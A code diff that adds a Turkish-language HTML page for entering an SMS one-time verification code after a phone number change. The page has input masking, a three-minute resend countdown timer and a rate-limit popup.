@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8" />
+  <title>DH Giriş</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="css/style.css" />
+</head>
+
+<body>
+  <div class="page-content">
+    <div class="container">
+      <div class="header">
+        <img class="logo" src="img/dh-giris-logo.png" />
+      </div>
+
+      <p class="regular-info">
+        <b>+90 (500) 108 22 44</b> numaralı yeni telefon numaranıza SMS ile gönderilen <b>XYZ123</b> referanslı tek kullanımlık kodu kutucuğa girin ya da ekranınızı kaplayan operatör mesajına onay verin.
+      </p>
+
+      <input id="smsCode" type="text" name="smsCode" class="phone-input" placeholder="- - - - - -" />
+
+      <div class="regular-button">Kodu Tekrar Gönder <span id="counter">(03:00)</span></div>
+
+      <div class="fixed-bottom no-fixed">
+        <p class="regular-info">
+          Giriş ve kayıt ile ilgili sorun mu yaşıyorsunuz?
+        </p>
+        <div class="regular-button">
+          Yardım Paneli
+        </div>
+      </div>
+
+      <div class="info-fixed-bottom">
+        <div class="general-info success">
+          Değişiklik doğrulandı, yönlendiriliyorsunuz.
+        </div>
+      </div>
+
+      <div class="popup-info">
+        <div class="box">
+          <p class="text">
+            Aynı telefon numarası için <b>3 dakikada bir</b> yeni doğrulama
+            kodu talebinde bulunabilirsiniz.<span id="counter2">(03:00 Kaldı)</span>
+          </p>
+          <div class="regular-button">Tamam</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="js/jquery.min.js"></script>
+  <script src="js/jquery.inputmask.bundle.js"></script>
+  <script src="js/main.js"></script>
+
+  <script>
+    $('.phone-input[name="smsCode"]').inputmask({
+      mask: "9 9 9 9 9 9",
+      placeholder: "-",
+    });
+
+    $('.phone-input[name="smsCode"]').mouseout(function () {
+      var val = $(this).val();
+      var color = val === "" ? "#cec2aa" : "";
+      $(this).css("color", color);
+    });
+    $('.phone-input[name="smsCode"]').mouseover(function () {
+      $(this).css("color", "");
+    });
+    $('.phone-input[name="smsCode"]').keydown(function () {
+      $(this).css("color", "");
+    });
+  </script>
+
+  <script>
+    window.onload = function () {
+      var counter = 180; // 3 dakika * 60 saniye
+      var interval = setInterval(function () {
+        document.getElementById('counter').innerText = '(' + formatTime(counter) + ')';
+        document.getElementById('counter2').innerText = '(' + formatTime(counter) + ' Kaldı)';
+        counter--;
+        if (counter < 0) {
+          clearInterval(interval);
+          document.getElementById('counter').style.display = 'none';
+        }
+      }, 1000);
+    };
+
+    function formatTime(seconds) {
+      var minutes = Math.floor(seconds / 60);
+      var remainingSeconds = seconds % 60;
+      return (minutes < 10 ? '0' + minutes : minutes) + ':' + (remainingSeconds < 10 ? '0' + remainingSeconds : remainingSeconds);
+    }
+  </script>
+
+  <script>
+    $(".popup-info .regular-button").click(function () {
+      $(this).parent().parent().css("display", "none")
+    })
+  </script>
+</body>
+
+</html>
